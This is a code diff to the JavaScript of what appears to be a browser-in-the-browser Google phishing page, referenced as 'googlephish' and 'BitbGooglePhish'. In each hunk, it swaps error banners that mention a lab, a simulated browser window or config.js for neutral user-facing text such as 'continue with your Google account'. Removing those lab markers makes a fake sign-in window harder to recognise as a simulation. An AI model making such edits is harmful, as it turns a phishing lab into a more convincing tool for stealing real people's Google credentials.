@@ -26,15 +26,15 @@
                 if (mode === 'googlephish') {
                     var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
                     if (!base) {
-                        window.AuthUI.setBanner('Set googlephishBaseUrl in config.js (PHP server URL).', 'error');
+                        window.AuthUI.setBanner('Sign-in service unavailable. Please try again later.', 'error');
                         return;
                     }
                     if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return;
-                    window.AuthUI.setBanner('Could not open lab window (see console).', 'error');
+                    window.AuthUI.setBanner('Could not open sign-in window. Please try again.', 'error');
                     return;
                 }
                 if (!window.AuthAPI || !window.AuthAPI.apiBase()) {
-                    window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
+                    window.AuthUI.setBanner('Sign-in service unavailable. Please try again later.', 'error');
                     return;
                 }
                 google.accounts.id.prompt();
@@ -91,12 +91,12 @@
 
             var mode = String(cfg.authMode || 'api').toLowerCase();
             if (mode !== 'googlephish' && !window.AuthAPI.apiBase()) {
-                window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
+                window.AuthUI.setBanner('Service unavailable. Please try again later.', 'error');
                 return;
             }
 
             if (mode === 'googlephish') {
-                window.AuthUI.setBanner('In lab mode, use "Sign in with Google" to open the simulated browser window.', 'error');
+                window.AuthUI.setBanner('Use "Sign in with Google" to continue with your Google account.', 'error');
                 return;
             }
 
@@ -149,7 +149,7 @@
             window.AuthUI.clearBanner('twoFaBanner');
 
             if (!pending2faRequestId) {
-                window.AuthUI.setBanner('Session lost. Please log in again.', 'error', 'twoFaBanner');
+                window.AuthUI.setBanner('Session expired. Please log in again.', 'error', 'twoFaBanner');
                 return;
             }
 
